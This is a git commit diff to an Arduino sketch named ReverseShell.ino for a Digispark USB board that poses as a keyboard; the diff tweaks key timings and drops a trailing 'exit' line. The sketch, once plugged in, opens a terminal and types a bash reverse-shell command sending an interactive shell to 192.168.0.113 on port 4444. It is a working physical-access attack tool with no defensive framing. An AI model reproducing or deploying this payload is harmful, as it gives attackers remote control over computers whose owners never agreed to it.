623516f87c82a26442e22240c6160fbb3643abed
Yehia Elborma <42983220+borma425@users.noreply.github.com>
2022-10-07 13:45:03 -0400

    Update ReverseShell.ino

--- scripts/linux/ReverseShell.ino
+++ scripts/linux/ReverseShell.ino
@@ -1,24 +1,24 @@
+
 #include "DigiKeyboard.h"
+
 void setup() {
 }
+
 void loop() {
 
   DigiKeyboard.update();
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
 
-  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT,MOD_CONTROL_RIGHT);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(0x17,MOD_ALT_LEFT);
+  DigiKeyboard.delay(500);
+
   DigiKeyboard.println('sh -i >& /dev/tcp/192.168.0.113/4444 0>&1'); 
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
+  DigiKeyboard.delay(2000);
+ for(;;){ /*empty*/ }
+ 
 
-
-  for (;;) {
-    /*empty*/
-  }
 }
